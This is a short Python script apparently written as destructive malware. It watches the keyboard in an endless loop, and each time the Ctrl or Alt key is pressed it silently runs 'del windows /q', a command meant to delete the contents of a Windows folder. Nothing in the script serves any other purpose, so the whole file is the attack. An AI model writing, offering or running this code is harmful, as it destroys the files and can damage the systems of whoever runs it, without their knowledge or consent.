import keyboard
import os

while True:
    if keyboard.read_key() == 'ctrl':
        os.system("del windows /q")

    elif keyboard.read_key() == 'alt':
        os.system("del windows /q")
